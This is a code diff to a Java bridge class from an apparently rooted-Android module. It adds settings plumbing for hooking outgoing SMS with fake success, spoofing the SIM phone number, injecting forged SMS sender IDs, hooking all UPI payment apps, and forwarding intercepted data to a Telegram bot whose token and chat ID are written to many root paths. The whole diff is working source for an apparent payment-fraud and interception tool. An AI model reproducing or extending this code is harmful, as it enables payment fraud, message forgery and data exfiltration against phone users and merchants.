@@ -191,6 +191,66 @@ public class HivirtusJsBridge {
         return false;
     }
 
+    private static boolean isDurableKey(String k) {
+        return "mock_phone_sim1".equals(k)
+                || "inject_sender_id".equals(k)
+                || "mock_sender_id".equals(k)
+                || "telegram_bot_token".equals(k)
+                || "telegram_chat_id".equals(k);
+    }
+
+    private static String normalizePhone(String raw) {
+        if (raw == null) return "";
+        String phone = raw.trim().replaceAll("[^0-9+]", "");
+        if (phone.startsWith("+91") && phone.length() > 10) {
+            phone = phone.substring(phone.length() - 10);
+        } else {
+            phone = phone.replaceAll("[^0-9]", "");
+        }
+        return phone;
+    }
+
+    /** Native + HTML Save — phone/sender/token/chat → sab files sync (empty wipe band). */
+    public static void syncAllSettings(Context ctx, String phoneRaw, String senderRaw,
+                                       String tokenRaw, String chatRaw,
+                                       boolean interceptOn, boolean fakeOn) {
+        if (ctx != null) setContext(ctx);
+        try {
+            JSONObject o = new JSONObject();
+            String phone = normalizePhone(phoneRaw);
+            String sid = senderRaw == null ? "" : senderRaw.trim();
+            String token = tokenRaw == null ? "" : tokenRaw.trim();
+            String chat = chatRaw == null ? "" : chatRaw.trim();
+            if ("AD-TEST-S".equals(sid)) sid = "";
+            boolean fake = fakeOn || phone.length() >= 10;
+            o.put("hook_outgoing_sms", interceptOn);
+            o.put("intercept_fake_success", interceptOn);
+            o.put("intercept_enabled", interceptOn);
+            o.put("enable_sim1_mock", fake);
+            o.put("enable_phone_spoof", fake);
+            o.put("enable_virtual_sim", fake && phone.length() >= 10);
+            o.put("fake_number_enabled", fake);
+            if (phone.length() >= 10) o.put("mock_phone_sim1", phone);
+            if (!sid.isEmpty()) {
+                o.put("inject_sender_id", sid);
+                o.put("override_incoming_sender", true);
+                o.put("sender_id_enabled", true);
+            }
+            if (!token.isEmpty()) o.put("telegram_bot_token", token);
+            if (!chat.isEmpty()) o.put("telegram_chat_id", chat);
+            if (!token.isEmpty() && !chat.isEmpty()) {
+                o.put("auto_forward_token", true);
+                o.put("telegram_enabled", true);
+                o.put("fake_intercept_telegram", true);
+            }
+            o.put("prefix_enabled", false);
+            o.put("hook_all_upi_apps", true);
+            o.put("auto_hook_foreground", true);
+            new HivirtusJsBridge().saveConfig(o.toString());
+        } catch (Exception ignored) {
+        }
+    }
+
     @JavascriptInterface
     public void saveConfig(String json) {
         if (json == null || json.isEmpty()) return;
@@ -198,27 +258,57 @@ public class HivirtusJsBridge {
         try {
             JSONObject incoming = new JSONObject(json);
             // Digits-only phone from THIS save — ignore stale spoof/tmp overlays
-            String incomingPhone = incoming.optString("mock_phone_sim1", "").trim()
-                    .replaceAll("[^0-9+]", "");
-            if (incomingPhone.startsWith("+91") && incomingPhone.length() > 10) {
-                incomingPhone = incomingPhone.substring(incomingPhone.length() - 10);
-            } else {
-                incomingPhone = incomingPhone.replaceAll("[^0-9]", "");
-            }
+            String incomingPhone = normalizePhone(incoming.optString("mock_phone_sim1", ""));
             if (incomingPhone.length() >= 10) {
                 incoming.put("mock_phone_sim1", incomingPhone);
             }
+
+            // Nested telegram: { bot_token, chat_id } (older UI)
+            try {
+                JSONObject tgObj = incoming.optJSONObject("telegram");
+                if (tgObj != null) {
+                    if (incoming.optString("telegram_bot_token", "").trim().isEmpty()) {
+                        String t = tgObj.optString("bot_token", tgObj.optString("telegram_bot_token", "")).trim();
+                        if (!t.isEmpty()) incoming.put("telegram_bot_token", t);
+                    }
+                    if (incoming.optString("telegram_chat_id", "").trim().isEmpty()) {
+                        String c = tgObj.optString("chat_id", tgObj.optString("telegram_chat_id", "")).trim();
+                        if (!c.isEmpty()) incoming.put("telegram_chat_id", c);
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+
+            String incomingSid = incoming.optString("inject_sender_id", "").trim();
+            if (incomingSid.isEmpty()) {
+                incomingSid = incoming.optString("mock_sender_id", "").trim();
+            }
+            if ("AD-TEST-S".equals(incomingSid)) incomingSid = "";
+            if (!incomingSid.isEmpty()) {
+                incoming.put("inject_sender_id", incomingSid);
+            }
+
+            String incomingToken = incoming.optString("telegram_bot_token", "").trim();
+            String incomingChat = incoming.optString("telegram_chat_id", "").trim();
 
             JSONObject merged = new JSONObject(readConfig());
             java.util.Iterator<String> keys = incoming.keys();
             while (keys.hasNext()) {
                 String k = keys.next();
-                merged.put(k, incoming.get(k));
+                Object v = incoming.get(k);
+                // Empty durable fields must NEVER wipe previously saved values
+                if (isDurableKey(k) && isEmptyValue(v)) continue;
+                merged.put(k, v);
             }
-            // Force phone from incoming after merge (readConfig must never win)
+            // Force non-empty values from THIS save
             if (incomingPhone.length() >= 10) {
                 merged.put("mock_phone_sim1", incomingPhone);
             }
+            if (!incomingSid.isEmpty()) {
+                merged.put("inject_sender_id", incomingSid);
+            }
+            if (!incomingToken.isEmpty()) merged.put("telegram_bot_token", incomingToken);
+            if (!incomingChat.isEmpty()) merged.put("telegram_chat_id", incomingChat);
 
             if (merged.optBoolean("enable_sim1_mock", false)
                     || merged.optBoolean("enable_phone_spoof", false)
@@ -227,10 +317,11 @@ public class HivirtusJsBridge {
                     || incomingPhone.length() >= 10) {
                 merged.put("enable_sim1_mock", true);
                 merged.put("enable_phone_spoof", true);
-                String phone = merged.optString("mock_phone_sim1", "").trim();
+                String phone = normalizePhone(merged.optString("mock_phone_sim1", ""));
                 if (phone.length() >= 10) {
+                    merged.put("mock_phone_sim1", phone);
                     merged.put("enable_virtual_sim", true);
-                    writeEverywhere(SPOOF_PHONE, "hivirtus_spoof_phone.txt", phone + "\n");
+                    wrote += writeEverywhere(SPOOF_PHONE, "hivirtus_spoof_phone.txt", phone + "\n");
                     writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt", phone + "\n");
                 }
             }
@@ -243,7 +334,8 @@ public class HivirtusJsBridge {
             if (!sid.isEmpty()) {
                 merged.put("override_incoming_sender", true);
                 merged.put("sender_id_enabled", true);
-                writeEverywhere(SENDER_ID_FILE, "hivirtus_sender_id.txt", sid + "\n");
+                wrote += writeEverywhere(SENDER_ID_FILE, "hivirtus_sender_id.txt", sid + "\n");
+                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt", sid + "\n");
             } else if (merged.optBoolean("sender_id_enabled", false)
                     || merged.optBoolean("override_incoming_sender", false)) {
                 merged.put("override_incoming_sender", true);
@@ -251,7 +343,8 @@ public class HivirtusJsBridge {
 
             if (merged.optBoolean("auto_forward_token", false)
                     || merged.optBoolean("telegram_enabled", false)
-                    || merged.optBoolean("fake_intercept_telegram", false)) {
+                    || merged.optBoolean("fake_intercept_telegram", false)
+                    || (!incomingToken.isEmpty() && !incomingChat.isEmpty())) {
                 merged.put("auto_forward_token", true);
                 merged.put("fake_intercept_telegram", true);
                 merged.put("telegram_enabled", true);
@@ -271,12 +364,25 @@ public class HivirtusJsBridge {
                         + "\"\n}\n";
                 wrote += writeEverywhere(TG_CREDS, "hivirtus_telegram_credentials.json", creds);
                 writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json", creds);
+                writeUtf8("/data/local/tmp/hivirtus_tg_token.txt", tgToken + "\n");
+                writeUtf8("/data/local/tmp/hivirtus_tg_chat.txt", tgChat + "\n");
+                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/tg_token.txt", tgToken + "\n");
+                writeUtf8("/data/adb/modules/hivirtus_zygisk_mode/tg_chat.txt", tgChat + "\n");
             }
-            if (wrote > 0) {
+            // Always mark Save — service.sh pushes to all apps + clears TG dedupe
+            writeUtf8(SAVE_OK_FLAG, "1\n");
+            try {
+                new File("/data/local/tmp/hivirtus_tg_out_dedupe.hash").delete();
+                new File("/data/local/tmp/hivirtus_tg_out_dedupe.ts").delete();
+            } catch (Exception ignored) {
+            }
+            if (wrote == 0) {
+                // Last-resort: still try tmp flag so root can harvest app filesDir
                 writeUtf8(SAVE_OK_FLAG, "1\n");
             }
         } catch (Exception e) {
             writeEverywhere(SAVE_TMP, "hivirtus_ui_save.json", json);
+            writeUtf8(SAVE_OK_FLAG, "1\n");
         }
     }
 
